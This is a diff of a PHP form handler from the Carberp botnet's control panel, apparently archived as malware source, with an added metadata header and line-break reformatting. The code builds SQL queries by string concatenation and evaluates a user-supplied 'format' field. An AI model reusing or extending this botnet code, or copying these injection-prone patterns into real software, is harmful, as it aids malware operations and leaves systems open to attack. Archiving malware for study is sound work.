@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -8,14 +19,16 @@ if(!empty($Cur['id'])){
     $item = $mysqli->query('SELECT * from bf_systems WHERE id = '.$Cur['id'].' LIMIT 1');
 	if($item->id == $Cur['id']){
 		$smarty->assign("item", $item);
-		if(isset($_POST['submit'])){			$format = $_POST['format'];
+		if(isset($_POST['submit'])){
+			$format = $_POST['format'];
 			@array_walk($_POST, 'real_escape_string');
             $_POST['format'] = $format;
 
 			if(empty($_POST['name'])){
 				$bad_form['name'] = $lang['knbp'];
 				$FORM_BAD = 1;
-			}else{				if(strlen($_POST['name']) > 125){
+			}else{
+				if(strlen($_POST['name']) > 125){
 					$bad_form['name'] = $lang['knbpaq'];
 					$FORM_BAD = 1;
 				}
@@ -24,7 +37,8 @@ if(!empty($Cur['id'])){
 			if(empty($_POST['percent'])){
 				$bad_form['percent'] = $lang['knbpa'];
 				$FORM_BAD = 1;
-			}else{				if(strlen($_POST['percent']) > 125){
+			}else{
+				if(strlen($_POST['percent']) > 125){
 					$bad_form['percent'] = $lang['knbpaa'];
 					$FORM_BAD = 1;
 				}else{
@@ -44,9 +58,11 @@ if(!empty($Cur['id'])){
 				error_reporting(0);
 				ob_end_clean();
 
-				if(strpos($eval, 'syntax error') != false){					$bad_form['format'] = $lang['knbpafz'];
+				if(strpos($eval, 'syntax error') != false){
+					$bad_form['format'] = $lang['knbpafz'];
 					$FORM_BAD = 1;
-				}elseif(strpos($eval, 'error</b>') != false){					$bad_form['format'] = $lang['knbpafz'];
+				}elseif(strpos($eval, 'error</b>') != false){
+					$bad_form['format'] = $lang['knbpafz'];
 					$FORM_BAD = 1;
 				}
 			}
